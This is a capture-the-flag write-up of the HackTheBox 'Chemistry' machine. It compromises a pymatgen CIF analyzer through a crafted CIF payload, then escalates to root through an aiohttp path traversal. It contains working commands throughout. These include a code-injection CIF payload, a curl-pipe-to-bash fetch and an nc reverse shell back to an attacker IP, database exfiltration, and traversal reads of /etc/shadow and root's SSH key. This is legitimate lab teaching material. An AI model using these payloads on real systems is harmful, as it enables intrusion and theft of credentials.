---
layout: post
released: 19-08-2024
creators: FisMatHack
pwned: true
tags:
 - diff/easy
 - os/linux
category:
  - HTB
description: Chemistry is running an http webserver on a strange port, port 5000. The webpage is of a chemistry CIF analyzer tool using python. The python libraries that it uses in order to parse the CIF files is vulnerable to an RCE vulnerability. Using this we can upload and execute a reverse shell to get a shell on the system. We can then find a database with users and their passwords. One of the passwords belongs to a user on the machine allowing us to ssh into the machine. As User we find a monitoring site running as root on port 8080 which is running aiohttp with a vulnerable setting that allows for an LFI. We can use this LFI to gain root's ssh keys and ssh into the box.
image: https://labs.hackthebox.com/storage/avatars/b8f3d660af2d3ed0929eb119e33526cf.png
---
![chemistry](https://labs.hackthebox.com/storage/avatars/b8f3d660af2d3ed0929eb119e33526cf.png)
# Information Gathering
## Enumeration
We're given a target IP to start with: `10.10.11.38`

Let's set it as our target so we can easily refer to it later:

```
export TARGET=10.10.11.38
```

We can start our enumeration with an `nmap` scan:

```
nmap -sC -sV -oN nmap/scan $TARGET
```

Here's the results of our `nmap` scan:

```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCj5eCYeJYXEGT5pQjRRX4cRr4gHoLUb/riyLfCAQMf40a6IO3BMzwyr3OnfkqZDlr6o9tS69YKDE9ZkWk01vsDM/T1k/m1ooeOaTRhx2Yene9paJnck8Stw4yVWtcq6PPYJA3HxkKeKyAnIVuYBvaPNsm+K5+rsafUEc5FtyEGlEG0YRmyk/NepEFU6qz25S3oqLLgh9Ngz4oGeLudpXOhD4gN6aHnXXUHOXJgXdtY9EgNBfd8paWTnjtloAYi4+ccdMfxO7PcDOxt5SQan1siIkFq/uONyV+nldyS3lLOVUCHD7bXuPemHVWqD2/1pJWf+PRAasCXgcUV+Je4fyNnJwec1yRCbY3qtlBbNjHDJ4p5XmnIkoUm7hWXAquebykLUwj7vaJ/V6L19J4NN8HcBsgcrRlPvRjXz0A2VagJYZV+FVhgdURiIM4ZA7DMzv9RgJCU2tNC4EyvCTAe0rAM2wj0vwYPPEiHL+xXHGSvsoZrjYt1tGHDQvy8fto5RQU=
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLzrl552bgToHASFlKHFsDGrkffR/uYDMLjHOoueMB9HeLRFRvZV5ghoTM3Td9LImvcLsqD84b5n90qy3peebL0=
|   256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIELLgwg7A8Kh8AxmiUXeMe9h/wUnfdoruCJbWci81SSB
5000/tcp open  http    syn-ack ttl 63 Werkzeug httpd 3.0.3 (Python 3.9.5)
|_http-title: Chemistry - Home
|_http-server-header: Werkzeug/3.0.3 Python/3.9.5
| http-methods: 
|_  Supported Methods: GET OPTIONS HEAD
```

As we can see we have an `http` and an `ssh` port open, we see the title of the page on port `5000` is `chemistry` so let's add that to our hosts file:

```
echo "$TARGET chemistry.htb" | sudo tee -a /etc/hosts
```

## Chemistry
visiting the webpage on port `5000` we are greeted with a `Chemistry CIF Analyzer`:

![](/assets/img/img_Chemistry/Chemistry-1740821911262.png)

In-order to access the site let's register an account:

![](/assets/img/img_Chemistry/Chemistry-1740821934760.png)

And login using our registered account:

![](/assets/img/img_Chemistry/Chemistry-1740821949242.png)

Once we login we are greeted with a dashboard asking for a `CIF` file to be uploaded

![](/assets/img/img_Chemistry/Chemistry-1740821966842.png)

Let's take a look at the example provided:

```
cat example.cif 
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1
```

When we upload the example file we are given an option to view it:

![](/assets/img/img_Chemistry/Chemistry-1740823162329.png)

Upon viewing we can see the `CIF` data:

![](/assets/img/img_Chemistry/Chemistry-1740823184130.png)

Looking around for vulnerabilities with this file type we come across the following:

[Arbitrary code execution when parsing a maliciously crafted JonesFaithfulTransformation transformation_string](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f)

A `poc` is even provided:

```
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("touch pwned");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

Let's make some changes to the `poc`, in particular we want to change the command executed by the following string:

```
[0].load_module ("os").system ("touch pwned");0,0,0
```

As we do not have access or visibility on the machine yet let's change the payload into something that can call back our attacking machine:

```
[0].load_module ("os").system ("whoami | nc 10.10.14.84 9001");0,0,0
```

Let's start a listener:

```
nc -lvnp 9001

istening on [any] 9001 ...
```

Then let's upload our modified `poc`:

![](/assets/img/img_Chemistry/Chemistry-1740822193043.png)

It seems that it is successfully uploaded!:

![](/assets/img/img_Chemistry/Chemistry-1740822210044.png)

When we click the view button the page seems to hang, however when we check our listener we get a callback!

```sh
nc -lvnp 9001                                                                                   
listening on [any] 9001 ...
connect to [10.10.14.84] from (UNKNOWN) [10.10.11.38] 51562
app
```

# Exploitation
Attempting to upload a reverse shell command as a payload fails, however we can instead write a reverse shell binary:

```sh
cat shell.sh

#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.84 9001 >/tmp/f
```

>
I'm using the `mkfifo` payload from [revshells.com](https://revshells.com) as it's known to be the most reliable

Next we need to be able to transfer the shell onto the target machine, I'm going to be using a simple python http server:

```
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Let's also create a listener on a separate terminal tab:

```
nc -lvnp 9001                                                                                   
listening on [any] 9001 ...
```

Lastly let's craft and upload the payload to get the file and execute it:

```
[0].load_module ("os").system ("curl http://10.10.14.84/shell.sh | /bin/bash")
```

When we view the `poc` we have just uploaded we successfully receive a shell on our listener as `app@chemistry`:

```
nc -lvnp 9001

listening on [any] 9001 ...
connect to [10.10.14.84] from (UNKNOWN) [10.10.11.38] 33376
bash: cannot set terminal process group (1068): Inappropriate ioctl for device
bash: no job control in this shell
app@chemistry:~$ 
```

Looking around our home directory we can find the web root for the `CIF analyzer`:

```
app@chemistry:~$ ls -la
ls -la
total 52
drwxr-xr-x 8 app  app  4096 Oct  9 20:18 .
drwxr-xr-x 4 root root 4096 Jun 16  2024 ..
-rw------- 1 app  app  5852 Oct  9 20:08 app.py
lrwxrwxrwx 1 root root    9 Jun 17  2024 .bash_history -> /dev/null
-rw-r--r-- 1 app  app   220 Jun 15  2024 .bash_logout
-rw-r--r-- 1 app  app  3771 Jun 15  2024 .bashrc
drwxrwxr-x 3 app  app  4096 Jun 17  2024 .cache
drwx------ 2 app  app  4096 Mar  1 10:30 instance
drwx------ 7 app  app  4096 Jun 15  2024 .local
-rw-r--r-- 1 app  app   807 Jun 15  2024 .profile
lrwxrwxrwx 1 root root    9 Jun 17  2024 .sqlite_history -> /dev/null
drwx------ 2 app  app  4096 Oct  9 20:13 static
drwx------ 2 app  app  4096 Oct  9 20:18 templates
drwx------ 2 app  app  4096 Mar  1 10:30 uploads
```

>
> In the output shown above we can see an `.sqlite_history` file, this is a good indicator that there's a database somewhere in the system.

We find `database.db` in the `instance` folder:

```
app@chemistry:~$ cd instance
cd instance
app@chemistry:~/instance$ ls -la
ls -la
total 28
drwx------ 2 app app  4096 Mar  1 10:30 .
drwxr-xr-x 8 app app  4096 Oct  9 20:18 ..
-rwx------ 1 app app 20480 Mar  1 10:30 database.db
```

Let's exfiltrate the file using another python server:

```
app@chemistry:~/instance$ python3 -m http.server 9001
```

```
curl http://chemistry.htb:9001/database.db -O                                     
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 20480  100 20480    0     0   223k      0 --:--:-- --:--:-- --:--:--  224k
```

We can use `sqlite browser` to browse through the database, here we can find the `users` table which provides the user's name and password hashes:

```
admin	[REDACTED]
app	[REDACTED]
rosa	[REDACTED]
robert	[REDACTED]
jobert	[REDACTED]
carlos	[REDACTED]
peter	[REDACTED]
victoria	[REDACTED]
tania	[REDACTED]
eusebio	[REDACTED]
gelacia	[REDACTED]
fabian	[REDACTED]
axel	[REDACTED]
kristel	[REDACTED]
test [REDACTED]	
dexter	[REDACTED]
hi	[REDACTED]
lobotech	[REDACTED]
lalala	[REDACTED]
w1ld	5c462a66cc9a2b5744411334ec087764
```

Let's cross-reference this list of users with the list of users on the target machine:

```
app@chemistry:~$ ls -la /home
ls -la /home
total 16
drwxr-xr-x  4 root root 4096 Jun 16  2024 .
drwxr-xr-x 19 root root 4096 Oct 11 11:17 ..
drwxr-xr-x  8 app  app  4096 Oct  9 20:18 app
drwxr-xr-x  6 rosa rosa 4096 Mar  1 02:39 rosa
```

Using [crackstation](https://crackstation.net) to crack the hashes we found we find the credentials of user `rosa`!

```
rosa:[REDACTED]
```

It is also apparent that user `rosa` has reused their password for their `ssh` login:

```
ssh rosa@chemistry.htb               
rosa@chemistry.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-196-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat 01 Mar 2025 10:50:12 AM UTC

  System load:           0.07
  Usage of /:            84.8% of 5.08GB
  Memory usage:          32%
  Swap usage:            0%
  Processes:             258
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.38
  IPv6 address for eth0: dead:beef::250:56ff:feb9:7dee


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

9 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Mar  1 08:35:17 2025 from 10.10.14.55
rosa@chemistry:~$ 
```

# Privilege Escalation
Looking around as user `rosa` we are able to identify a service running internally on port: `8080`:

```
netstat -tulnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:9001            0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -  
```

Let's attempt to footprint this service:

```
rosa@chemistry:~$ nc localhost 8080 -v
Connection to localhost 8080 port [tcp/http-alt] succeeded!
```

We can see that it is an `http` server, let's forward this port to our attacking machine:

```
ssh rosa@chemistry.htb -L 8000:127.0.0.1:8080
```

>
I am using port `8000` on the attacker machine as I am running Caido on port `8080`

Now when we visit our browser on `127.0.0.1:8000` we can see the service running:

![](/assets/img/img_Chemistry/Chemistry-1740826955143.png)

Running a quick `nmap` scan we can determine that `python aiohttp 3.9.1` is the backend:

```
nmap localhost -p 8000 -sC -sV  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-01 22:01 AEDT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000066s latency).
Other addresses for localhost (not scanned): ::1

PORT     STATE SERVICE VERSION
8000/tcp open  http    aiohttp 3.9.1 (Python 3.9)
|_http-title: Site Monitoring
|_http-server-header: Python/3.9 aiohttp/3.9.1
```

Looking around we can find the following vulnerability including a `poc`:

[CVE 2024 2334](https://github.com/wizarddos/CVE-2024-23334)

If we take a look at the `poc` we can see that it is simply requesting the site's static page and then using directory traversal to read local files.

In this case when viewing the page's source we are unable to find a `/static` folder so instead we'll use `/assets/`:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Site Monitoring</title>
    <link rel="stylesheet" href="/assets/css/all.min.css">
    <script src="/assets/js/jquery-3.6.0.min.js"></script>
    <script src="/assets/js/chart.js"></script>
    <link rel="stylesheet" href="/assets/css/style.css">
    <style>
    h2 {
      color: black;
      font-style: italic;
    }
    </style>
</head>
```

Let's execute the exploit manually using `curl`

```
curl --path-as-is http://127.0.0.1:8000/assets/../../../../../etc/shadow

root:[REDACTED]:19891:0:99999:7:::
daemon:*:19430:0:99999:7:::
bin:*:19430:0:99999:7:::
sys:*:19430:0:99999:7:::
sync:*:19430:0:99999:7:::
games:*:19430:0:99999:7:::
man:*:19430:0:99999:7:::
lp:*:19430:0:99999:7:::
mail:*:19430:0:99999:7:::
news:*:19430:0:99999:7:::
uucp:*:19430:0:99999:7:::
proxy:*:19430:0:99999:7:::
www-data:*:19430:0:99999:7:::
backup:*:19430:0:99999:7:::
list:*:19430:0:99999:7:::
irc:*:19430:0:99999:7:::
gnats:*:19430:0:99999:7:::
nobody:*:19430:0:99999:7:::
systemd-network:*:19430:0:99999:7:::
systemd-resolve:*:19430:0:99999:7:::
systemd-timesync:*:19430:0:99999:7:::
messagebus:*:19430:0:99999:7:::
syslog:*:19430:0:99999:7:::
_apt:*:19430:0:99999:7:::
tss:*:19430:0:99999:7:::
uuidd:*:19430:0:99999:7:::
tcpdump:*:19430:0:99999:7:::
landscape:*:19430:0:99999:7:::
pollinate:*:19430:0:99999:7:::
fwupd-refresh:*:19430:0:99999:7:::
usbmux:*:19889:0:99999:7:::
sshd:*:19889:0:99999:7:::
systemd-coredump:!!:19889::::::
rosa:[REDACTED]:19893:0:99999:7:::
lxd:!:19889::::::
app:[REDACTED]:19890:0:99999:7:::
_laurel:!:20007::::::
```

>[!note]
>When attempting directory traversal through `curl` we must use the `--path-as-is` flag to force curl to use the exact path we specify.

Using this `LFI` vulnerability we're able to extract `root`'s `ssh` key:

```
curl --path-as-is http://127.0.0.1:8000/assets/../../../../../root/.ssh/id_rsa                                                                                                                               
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtc
NhAAAAAwEAAQAAAYEAsFbYzGxskgZ6YM1LOUJsjU66WHi8Y2ZFQcM3G8VjO+NHKK8P0hI
UbnmTGaPeW4evLeehnYFQleaC9u//vciBLNOWGqeg6Kjsq2lVRkAvwK2suJSTtVZ8qGi1
j0wO69QoWrHERaRqmTzranVyYAdTmiXlGqUyiy0I7GVYqhv/QC7jt6For4PMAjcT0ED3G
HVJONbz2eav5aFJcOvsCG1aC93Le5R43Wgwo7kHPlfM5DjSDRqmBxZpaLpWK3HwCKYITo
DfYsOMY0zyI0k5yLl1s685qJIYJHmin9HZBmDIwS7e2riTHhNbt2naHxd0WkJ8PUTgXuV
UOljWP/TVPTkM5byav5bzhIwxhtdTy02DWjqFQn2kaQ8xe9X+Ymrf2wK8C4ezAycvlf3I
ATj++Xrpmmh9uR1HdS1XvD7glEFqNbYo3Q/OhiMto1JFqgWugeHm715yDnB3A+og4SFzr
vrLegAOwvNlDYGjJWnTqEmUDk9ruO4Eq4ad1TYMbAAAFiPikP5X4pD+VAAAAB3NzaC1yc
EAAAGBALBW2MxsbJIGemDNSzlCbI1Oulh4vGNmRUHDNxvFYzvjRyivD9ISFFG55kxmj3l
Hry3noZ2BUJXmgvbv/73IgSzTlhqnoOio7KtpVUZAL8CtrLiUk7VWfKhotb49MDuvUKFq
xEWkapk862p1cmAHU5ol5RqlMostCOxlWKob/0Au47ehaK+DzAI3E9BA9xpB1STjW89nm
+WhSXDr7AhtWgvdy3uUeN1oMKO5Bz5XzOQ40g0apgcWaWi6Vitx8AimCE26A32LDjGNM8
NJOci5dbOvOaiSGCR5op/R2QZgyMEu3tq4kx4TW7dp2h8XdFpCfD1E4F7ldlDpY1j/01T
5DOW8mr+W84SMMYbXU8tNg1o6hUJ9pGkPMXvV/mJq39sCvAuHswMnL5X9yLwE4/vl66Zp
[REDACTED]
```

Let's write this key to `root_id_rsa`, in order to use `ssh` keys we must first set the permissions to be only permissive to the owner:

```
chmod 600 root_id_rsa
```

After which we can then `ssh` into root by using the private key:

```
ssh root@chemistry.htb -i root_id_rsa 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-196-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat 01 Mar 2025 11:20:59 AM UTC

  System load:           0.0
  Usage of /:            84.9% of 5.08GB
  Memory usage:          33%
  Swap usage:            0%
  Processes:             263
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.38
  IPv6 address for eth0: dead:beef::250:56ff:feb9:7dee


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

9 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Oct 11 14:06:59 2024
root@chemistry:~# 
```

# Beyond Root
Interestingly after looking at the `monitoring_site` we can notice that the directory `static/`
does in fact exist:

```
root@chemistry:/opt/monitoring_site# ls -la
total 24
drwx------ 5 root root 4096 Oct  9 20:27 .
drwxr-xr-x 3 root root 4096 Jun 16  2024 ..
-rwx------ 1 root root  900 Oct  9 20:27 app.py
drwx------ 2 root root 4096 Jun  9  2024 data
drwx------ 5 root root 4096 Jun 16  2024 static
drwx------ 2 root root 4096 Oct  9 20:28 templates
```

However as can be seen on `app.py` it is being redirected to `/assets/` instead which validates our exploitation path.

```
import aiohttp
import aiohttp_jinja2
import jinja2
import os
import json
import re
from aiohttp import web
import subprocess

async def list_services(request):
    # Logic to retrieve and return the list of services
    services = subprocess.check_output(['service', '--status-all']).decode('utf-8').split('\n')
    return web.json_response({"services": services})

async def index(request):
    # Load sample data from a JSON file
    with open('data/data.json') as f:
        data = json.load(f)

    return aiohttp_jinja2.render_template('index.html', request, data)

app = web.Application()
aiohttp_jinja2.setup(app, loader=jinja2.FileSystemLoader('templates'))

app.router.add_get('/', index)
app.router.add_static('/assets/', path='static/', follow_symlinks=True)
app.router.add_get('/list_services', list_services)

if __name__ == '__main__':
    web.run_app(app, host='127.0.0.1', port=8080)
```
